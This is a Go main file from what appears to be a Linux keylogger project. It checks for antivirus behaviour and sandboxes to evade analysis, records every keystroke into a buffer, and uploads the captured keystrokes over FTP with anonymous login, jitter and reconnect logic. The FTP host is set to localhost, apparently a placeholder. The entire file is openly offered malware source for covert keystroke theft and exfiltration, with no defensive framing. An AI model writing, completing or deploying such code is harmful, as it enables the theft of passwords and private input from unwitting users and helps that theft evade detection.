package main

import (
	"bytes"
	"time"

	"github.com/adelapazborrero/logger/pkg/connector"
	"github.com/adelapazborrero/logger/pkg/keylogger"
	"github.com/adelapazborrero/logger/pkg/keylogger_linux"
	"github.com/adelapazborrero/logger/pkg/tools"
)

const (
	FTP_HOST        = "localhost:21"
	DEFAULT_TIMEOUT = 5 * time.Second
	RECONNECT_DELAY = 5 * time.Second
	MAX_JITTER      = 5
	USERNAME        = "anonymous"
	PASSWORD        = ""
	LOG_BUFFER_SIZE = 1024
)

func main() {
	tools.AVBehaviourCheck()
	tools.SandboxCheck()

	logBuffer := bytes.NewBuffer(make([]byte, LOG_BUFFER_SIZE))

	keyLogger := keylogger.NewKeyLoggerService("linux", keylogger_linux.NewLinuxLogger())
	keyLogger.CaptureKeys(logBuffer)

	ftp := connector.NewFTP(
		FTP_HOST,
		USERNAME,
		PASSWORD,
		DEFAULT_TIMEOUT,
		MAX_JITTER,
		RECONNECT_DELAY,
	)

	ftp.SendData(logBuffer)
}
